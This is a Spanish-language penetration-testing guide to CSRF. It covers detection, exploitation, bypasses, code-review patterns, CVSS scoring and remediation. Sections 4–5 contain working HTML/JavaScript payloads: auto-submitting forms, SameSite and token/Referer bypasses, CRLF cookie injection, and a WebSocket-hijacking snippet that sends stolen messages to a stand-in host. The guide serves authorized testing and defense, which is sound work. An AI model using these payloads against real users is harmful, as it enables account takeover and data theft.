# Falsificación de petición en sitios cruzados (CSRF, Cross-Site Request Forgery)

| Clasificación | |
|---|---|
| CWE | CWE-352 — Cross-Site Request Forgery (CSRF). Relacionadas: CWE-1275 (cookie sensible con atributo SameSite inadecuado), CWE-346 (validación de origen) |
| OWASP Top 10:2025 | A01 — Broken Access Control |
| OWASP API Top 10:2023 | API8 — Security Misconfiguration (APIs con autenticación por cookie sin defensa CSRF) |
| WSTG | WSTG-SESS-05 |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (formularios, GET, JSON, SameSite Lax/Strict, login CSRF, WebSocket, GraphQL) · 5. Evasión de defensas (tokens, Referer/Origin, cabeceras) · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

En un CSRF, una página controlada por el atacante hace que el navegador de la víctima envíe una petición que **cambia estado** (cambiar correo, contraseña, hacer una transferencia, añadir un administrador) a la aplicación objetivo. El navegador adjunta automáticamente las **credenciales ambientales** (*ambient credentials*: cookies de sesión, autenticación HTTP básica, certificados de cliente), así que la aplicación cree que la acción la pidió el usuario.

Hacen falta tres condiciones:

1. Una acción relevante que se dispara con una petición.
2. La sesión se identifica **solo** con credenciales que el navegador envía solo (cookies). Si la API exige `Authorization: Bearer` leída de JavaScript, no hay CSRF clásico.
3. Ningún parámetro impredecible (token CSRF, contraseña actual) y ninguna comprobación de origen que el atacante no pueda satisfacer.

**SameSite** es un atributo de cookie que limita su envío en peticiones *cross-site*. *Site* significa esquema + dominio registrable (eTLD+1): `a.example.com` y `b.example.com` son el **mismo site** aunque sean orígenes distintos. Valores: `Strict` (nunca en peticiones iniciadas desde otro site), `Lax` (solo en navegaciones de nivel superior con métodos «seguros» como GET), `None` (siempre; exige `Secure`).

## 2. Dónde buscar (señales del reconocimiento)

- Formularios y endpoints que modifican estado: perfil, correo, contraseña, MFA, direcciones, métodos de pago, invitaciones, roles, claves API, webhooks, borrado de cuenta, compras, «vincular cuenta social».
- Sesión por cookie: buscar `Set-Cookie` y sus atributos (`SameSite`, `Secure`, `HttpOnly`). Cookie de sesión **sin `SameSite`** explícito o con `SameSite=None` = candidata fuerte.
- Peticiones sin parámetro tipo `csrf`, `_token`, `authenticity_token`, `__RequestVerificationToken`, `X-CSRF-Token`, `X-XSRF-TOKEN`.
- Acciones por **GET** (`/logout`, `/delete?id=`, `/subscribe`, `/api/user/role?set=admin`).
- APIs JSON que aceptan también `application/x-www-form-urlencoded`, `multipart/form-data` o `text/plain`.
- Parámetros de sobrescritura de método: `_method`, `X-HTTP-Method-Override`.
- WebSockets autenticados por cookie (riesgo de *Cross-Site WebSocket Hijacking*).
- GraphQL que acepta GET o tipos de contenido simples (ver `vulns/graphql.md`).
- Flujos OAuth sin `state` (CSRF de vinculación, ver `vulns/oauth-oidc-saml.md`).

## 3. Detección segura (primeras sondas, no destructivas)

Trabajar con **dos cuentas de prueba propias** (atacante y víctima) y sobre acciones reversibles (cambiar el nombre visible, la biografía o una preferencia).

1. Capturar la petición legítima en Burp y repetirla:
   - sin el token / con el token vacío / con un token aleatorio de la misma longitud;
   - con el token de la **otra** cuenta;
   - cambiando POST → GET (parámetros a la query);
   - cambiando `Content-Type` a `application/x-www-form-urlencoded` o `text/plain`;
   - sin cabeceras `Origin` y `Referer`, y con `Origin: https://evil.example`.
2. Revisar `SameSite` de la cookie de sesión y el navegador de la víctima (las reglas cambian entre Chrome, Firefox y Safari; ver 4.4).
3. Generar la PoC (Burp → *Engagement tools → Generate CSRF PoC*) y abrirla **desde otro dominio** (un servidor propio o `file://` no sirve: usar un host real del auditor) con la sesión de la víctima de prueba iniciada.
4. Confirmar el cambio en la cuenta de prueba y revertirlo.

## 4. Explotación por contexto o tecnología

### 4.1 Formulario POST clásico (autoenvío)

```html
<html><body>
<form action="https://t.example/account/email" method="POST">
  <input type="hidden" name="email" value="auditor+csrf@dominio-auditor.example">
</form>
<script>history.pushState('','','/');document.forms[0].submit();</script>
</body></html>
```

### 4.2 Acción por GET

```html
<img src="https://t.example/account/delete-avatar?confirm=1">
<!-- navegación de nivel superior (envía cookies SameSite=Lax) -->
<script>location='https://t.example/settings/newsletter?enabled=0'</script>
```

### 4.3 CSRF contra endpoints JSON

Un formulario HTML solo envía tres tipos de contenido «simples» sin *preflight* (la petición previa `OPTIONS` que el navegador hace para pedir permiso CORS): `application/x-www-form-urlencoded`, `multipart/form-data` y `text/plain`.

```html
<!-- text/plain: el nombre y el valor se unen con "=" -->
<form action="https://t.example/api/profile" method="POST" enctype="text/plain">
  <input name='{"displayName":"csrf-poc","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
<!-- cuerpo resultante: {"displayName":"csrf-poc","x":"="} -->
```

```html
<script>
fetch('https://t.example/api/profile',{method:'POST',mode:'no-cors',credentials:'include',
  headers:{'Content-Type':'text/plain'},body:'{"displayName":"csrf-poc"}'});
</script>
```

Si el servidor exige `Content-Type: application/json`, el navegador hará *preflight* y el CSRF solo será posible con una mala configuración CORS (ver `vulns/cors.md`). Probar también si el backend ignora el `Content-Type` o acepta el mismo cuerpo como formulario (`displayName=csrf-poc`).

### 4.4 SameSite: matices que determinan la explotabilidad

| Situación | Efecto práctico |
|---|---|
| Cookie **sin** atributo SameSite en Chrome/Edge | Se trata como `Lax`, **pero** durante los **2 primeros minutos** tras crearse la cookie también se envía en POST de nivel superior cross-site (mitigación «Lax+POST») |
| Cookie sin SameSite en Firefox y Safari | No aplican Lax por defecto: se comporta como `None` en navegaciones de nivel superior (las protecciones de cookies de terceros afectan sobre todo a iframes y subrecursos) |
| `SameSite=Lax` explícito | Solo viaja en navegaciones de nivel superior con método seguro (GET/HEAD); **sin** ventana de 2 minutos |
| `SameSite=Strict` | No viaja en ninguna petición iniciada desde otro site, ni siquiera al seguir un enlace |
| `SameSite=None; Secure` | Viaja siempre (sujeto al bloqueo de cookies de terceros del navegador) |

**Abuso de la ventana de 2 minutos** (cookie sin SameSite explícito): forzar que la víctima obtenga una cookie nueva (por ejemplo, abriendo el inicio de sesión SSO/OAuth, que reemite la sesión sin pedir contraseña) y lanzar el POST justo después:

```html
<script>
window.onclick = () => {
  window.open('https://t.example/login/sso');      // refresca la cookie de sesión
  setTimeout(()=>document.forms[0].submit(), 5000);
};
</script>
<form action="https://t.example/account/email" method="POST">
  <input type="hidden" name="email" value="auditor+csrf@dominio-auditor.example">
</form>
<p>Haz clic en cualquier parte</p>
```

**Saltar Lax con GET + sobrescritura de método**: algunos frameworks o configuraciones aceptan `_method` en la query string de un GET:

```html
<script>location='https://t.example/account/email?email=auditor%2Bcsrf@dominio-auditor.example&_method=POST'</script>
```

**Saltar Lax/Strict desde el mismo site**:

- *Gadget* de redirección en el propio sitio (una redirección del lado del cliente, por ejemplo `/post/comment/confirm?postId=../../account/email?email=x%26submit=1`), porque la segunda petición la inicia el propio site.
- XSS, subida de HTML o *takeover* en un **subdominio hermano** (`blog.example.com` → `app.example.com` es same-site): ver `vulns/xss.md`.
- Funciones que emiten peticiones de nivel superior desde el propio dominio (previsualizadores, acortadores internos).

### 4.5 Login CSRF y logout CSRF

- **Login CSRF**: hacer que la víctima inicie sesión en la **cuenta del atacante** (formulario de login sin token). Lo que la víctima introduzca después (tarjeta, documentos, historial de búsqueda) queda en la cuenta del atacante. También sirve para convertir un auto-XSS en XSS explotable.
  ```html
  <form action="https://t.example/login" method="POST">
    <input name="username" value="cuenta-prueba-atacante"><input name="password" value="(contraseña de prueba)">
  </form><script>document.forms[0].submit()</script>
  ```
- **Logout CSRF**: normalmente bajo impacto; relevante solo en cadenas (forzar re-login a través de un flujo vulnerable).

### 4.6 Cross-Site WebSocket Hijacking (CSWSH)

El *handshake* de WebSocket es un GET que lleva cookies y no está sujeto a CORS. Si el servidor no valida `Origin` ni usa token, una página externa abre el socket en nombre de la víctima y **lee** las respuestas:

```html
<script>
const ws = new WebSocket('wss://t.example/chat');
ws.onopen = () => ws.send('{"action":"history"}');
ws.onmessage = e => fetch('https://oast.example/log',{method:'POST',mode:'no-cors',body:e.data.slice(0,200)});
</script>
```

Con `SameSite=Lax/Strict` las cookies no viajan en el handshake cross-site (salvo desde un subdominio hermano). Ver `vulns/api-rest-grpc-websocket.md`.

### 4.7 GraphQL

```html
<form action="https://t.example/graphql" method="POST">
  <input name="query" value='mutation{updateProfile(bio:"csrf-poc"){id}}'>
</form><script>document.forms[0].submit()</script>
<!-- o por GET si el servidor ejecuta mutaciones por GET -->
<img src="https://t.example/graphql?query=mutation%7BupdateProfile(bio:%22csrf-poc%22)%7Bid%7D%7D">
```

### 4.8 Peticiones multipart (subidas de fichero)

```html
<script>
const fd = new FormData();
fd.append('avatar', new Blob(['GIF89a'],{type:'image/gif'}), 'poc.gif');
fetch('https://t.example/profile/avatar',{method:'POST',body:fd,credentials:'include',mode:'no-cors'});
</script>
```

## 5. Evasión de filtros y defensas

### 5.1 Tokens anti-CSRF

| Debilidad | Prueba |
|---|---|
| Validación solo si el parámetro existe | Eliminar el parámetro entero |
| Token no ligado a la sesión (bolsa global de tokens válidos) | Usar un token válido de la cuenta atacante |
| Token ligado a una cookie que no es la de sesión (`csrfKey`) | Inyectar la cookie del atacante en la víctima (CRLF, subdominio que fija cookies con `Domain=.example.com`) y usar su pareja token |
| *Double submit* (token en cookie y en parámetro, se compara que sean iguales) | Fijar la cookie con un valor propio (inyección de cookie o subdominio) y enviar el mismo valor en el parámetro |
| Token validado solo en POST | Cambiar a GET |
| Token reutilizable y filtrado | Tokens en URL (`Referer`), en respuestas JSONP, en `postMessage`, por *dangling markup* |
| Token predecible | Analizar varios tokens (Burp Sequencer); marcas de tiempo, hashes del ID de usuario |
| Validación de longitud/formato, no de valor | Token aleatorio con el mismo formato |

Ejemplo de inyección de cookie mediante CRLF en otro endpoint (si existe; ver `vulns/otras-inyecciones.md`):

```html
<img src="https://t.example/?search=x%0d%0aSet-Cookie:%20csrf=valorAtacante%3b%20SameSite=None%3b%20Secure" onerror="document.forms[0].submit()">
```

### 5.2 Comprobaciones de Referer y Origin

```html
<!-- Si la validación se omite cuando falta el Referer -->
<meta name="referrer" content="no-referrer">
```

```html
<!-- Si se comprueba que el Referer "contiene" el dominio: incluirlo en la query de la página atacante -->
<script>history.pushState('', '', '/?t.example');</script>
<!-- y servir la PoC con la cabecera  Referrer-Policy: unsafe-url  para que se envíe la URL completa -->
```

Variantes de dominio para validaciones con `startsWith`/regex: `https://t.example.evil.com`, `https://evil.com/t.example`, `https://t-example.com` (punto sin escapar en regex). `Origin: null` se puede generar desde un iframe con `sandbox` o desde `data:` si el servidor acepta `null`.

### 5.3 Cabeceras personalizadas

Exigir una cabecera como `X-Requested-With` o `X-CSRF-Token` es una defensa válida **solo** si CORS no permite su envío desde otros orígenes. Revisar `Access-Control-Allow-Headers` y `Access-Control-Allow-Origin` reflejado (ver `vulns/cors.md`).

### 5.4 Fetch Metadata

Si el servidor bloquea `Sec-Fetch-Site: cross-site`, buscar acciones accesibles por navegación de nivel superior permitidas por la política, o una vía *same-site* (subdominio).

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **Toma de cuenta**: CSRF en cambio de correo → «olvidé mi contraseña» al nuevo correo. ⚠️ Solo contra la cuenta de prueba víctima del auditor; si afecta a flujos reales (envío de correos a terceros) **requiere confirmación explícita del cliente**.
- **CSRF en acciones de administrador**: crear un usuario, cambiar un rol. Demostrar con un administrador de prueba proporcionado por el cliente.
- **CSRF + XSS almacenado** en un campo que solo el usuario puede editar: el CSRF inserta la carga en la cuenta de la víctima.
- **Login CSRF + auto-XSS**: la víctima entra en la cuenta del atacante y ejecuta la carga.
- **CSWSH**: lectura de mensajes privados (impacto de confidencialidad, no solo integridad).
- **OAuth sin `state`**: vinculación de la identidad del atacante a la cuenta de la víctima.
- ⚠️ CSRF que mueve dinero, borra datos o envía mensajes: **requiere confirmación explícita del cliente**; preferir demostrar con la acción equivalente más inocua del mismo endpoint (cambiar un campo de texto).

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Express / Node**
```javascript
// Vulnerable: sesión por cookie, sin token, cookie sin SameSite
app.use(session({ secret, cookie: { httpOnly: true } }));
app.post('/account/email', (req, res) => updateEmail(req.session.uid, req.body.email));
app.get('/account/delete', ...);                                 // cambio de estado por GET
// Seguro: SameSite + token sincronizado (paquete moderno, p. ej. csrf-csrf / csrf-sync) + método correcto
app.use(session({ secret, cookie: { httpOnly: true, secure: true, sameSite: 'lax' } }));
```

**Django**: `@csrf_exempt`, `CSRF_TRUSTED_ORIGINS` demasiado amplio, `CSRF_COOKIE_SAMESITE=None`, vistas que cambian estado en GET.
**Rails**: `skip_before_action :verify_authenticity_token`, `protect_from_forgery with: :null_session` en controladores con sesión por cookie.
**Spring Security**: `http.csrf().disable()` / `csrf(c -> c.disable())`, `ignoringRequestMatchers("/api/**")` con sesión por cookie.
**Laravel**: rutas en `$except` de `VerifyCsrfToken` / `validateCsrfTokens(except: [...])`.
**ASP.NET Core**: acciones POST sin `[ValidateAntiForgeryToken]` ni `AutoValidateAntiforgeryToken` global; `[IgnoreAntiforgeryToken]`.
**PHP**: comparación con `==` (comparación laxa), token solo comprobado si `isset($_POST['token'])`.

```bash
rg -n 'csrf_exempt|csrf\(\)\.disable|csrf\(.*disable|skip_before_action\s+:verify_authenticity_token|null_session|IgnoreAntiforgeryToken|VerifyCsrfToken|validateCsrfTokens|ignoringRequestMatchers|ignoringAntMatchers'
rg -n "sameSite\s*[:=]\s*['\"]?none|SameSite=None|SESSION_COOKIE_SAMESITE\s*=\s*None|CSRF_COOKIE_SAMESITE"
rg -n "app\.get\(.*(delete|remove|update|change|set|transfer)" -g '*.{js,ts}'
rg -n "@GetMapping\(.*(delete|update|change)" -g '*.java'
rg -n "new WebSocketServer|ws\.on\('connection'|@ServerEndpoint|websocket" -i   # revisar validación de Origin
```

```bash
semgrep --config p/django --config p/flask --config p/express --config p/java --config p/php .   # contienen reglas de CSRF desactivado
```

## 8. Falsos positivos frecuentes

- API que solo acepta `Authorization: Bearer` (no cookies): no es CSRF.
- Cookie `SameSite=Lax/Strict` explícita y la acción exige POST, sin gadgets same-site: el ataque no funciona en navegadores modernos (puede reportarse como defensa en profundidad si el token falta).
- La PoC «funciona» solo porque se abrió desde el mismo origen o en Burp Repeater: probar siempre desde otro site real.
- Acciones sin impacto (cambiar idioma, tema, cerrar sesión) → informativo salvo cadena.
- Endpoint que exige la contraseña actual o MFA para la acción.
- El servidor exige `Content-Type: application/json` y CORS no está mal configurado.

## 9. Evidencia mínima para validarlo

- PoC HTML alojada en un dominio distinto (indicar URL y navegador/versión).
- Estado antes/después de la cuenta de prueba víctima (captura o respuesta de la API).
- Petición capturada que muestra que se enviaron las cookies y que no hubo token/Origin válido.
- Atributos `Set-Cookie` de la sesión y explicación de por qué SameSite no lo impide.
- Reversión del cambio.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario | CVSS 3.1 | CVSS 4.0 (calcular con la calculadora de FIRST) |
|---|---|---|
| Cambio de dato de bajo valor | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` = 4.3 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N` |
| Acción sensible (cambio de configuración, compra) | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` = 6.5 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Toma de cuenta (cambio de correo/contraseña) | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` = 8.1 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Depende de la ventana de 2 min o de un gadget | Subir a `AC:H` | `AT:P` |
| Login/logout CSRF aislado | Bajo / informativo | — |

En CVSS 4.0 se usa `UI:A` cuando la víctima debe seguir un enlace del atacante, y `UI:P` si la carga se dispara al visitar una página legítima que el atacante puede modificar (por ejemplo, una imagen en un foro que la víctima ya frecuenta).

## 11. Remediación (con ejemplo de código correcto)

1. **Token sincronizado** (aleatorio, ligado a la sesión, validado en todas las peticiones que cambian estado, comparado en tiempo constante) o patrón *double submit* **firmado** (HMAC del ID de sesión).
2. **Cookies** de sesión con `SameSite=Lax` (o `Strict` cuando el flujo lo permita), `Secure`, `HttpOnly`, y prefijo `__Host-`.
3. **Nunca** cambiar estado con GET; no aceptar `_method` en GET.
4. Comprobar **Fetch Metadata** (`Sec-Fetch-Site`) y/o `Origin` en peticiones no seguras como capa adicional.
5. APIs JSON: exigir `Content-Type: application/json` y rechazar tipos simples.
6. Reautenticación (contraseña actual o MFA) para cambio de correo, contraseña, MFA y pagos.
7. WebSockets: validar `Origin` en el handshake y usar un token de conexión.
8. OAuth: parámetro `state` ligado a la sesión (y PKCE).

```javascript
// Express: Fetch Metadata + token sincronizado sencillo
import crypto from 'node:crypto';
app.use((req, res, next) => {
  const site = req.get('Sec-Fetch-Site');
  if (!['GET','HEAD','OPTIONS'].includes(req.method) && site && !['same-origin','none'].includes(site))
    return res.status(403).end();
  next();
});
app.use((req, res, next) => {
  req.session.csrf ??= crypto.randomBytes(32).toString('hex');
  res.locals.csrf = req.session.csrf;
  if (['GET','HEAD','OPTIONS'].includes(req.method)) return next();
  const sent = Buffer.from(String(req.get('X-CSRF-Token') || req.body._csrf || ''));
  const good = Buffer.from(req.session.csrf);
  if (sent.length !== good.length || !crypto.timingSafeEqual(sent, good)) return res.status(403).end();
  next();
});
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Suite Pro — *Generate CSRF PoC* | PoC HTML automática (incluye opciones de autoenvío y `text/plain`) | Tras identificar la petición candidata |
| Burp Repeater | Probar eliminación/cambio de token, método y `Content-Type` | Siempre, primero |
| Burp Sequencer | Aleatoriedad de tokens | Si se sospecha token predecible |
| Servidor web propio (`python3 -m http.server`, o un VPS/dominio del auditor) | Alojar la PoC en un site distinto | Validación |
| DevTools → Application → Cookies | Ver SameSite y momento de creación de la cookie | Siempre |
| `semgrep` / `rg` | Sección 7 | Caja blanca |

## 13. Referencias

- OWASP Cross-Site Request Forgery Prevention Cheat Sheet; WSTG-SESS-05.
- PortSwigger Web Security Academy — CSRF; *Bypassing SameSite cookie restrictions*; *Cross-site WebSocket hijacking*.
- web.dev — «SameSite cookies explained»; Chromium — política «Lax+POST» (2 minutos).
- MDN — `Set-Cookie` SameSite; Fetch Metadata Request Headers.
- PayloadsAllTheThings — *Cross-Site Request Forgery*.
- HackTricks — *CSRF (Cross Site Request Forgery)*.
- CWE-352, CWE-1275.
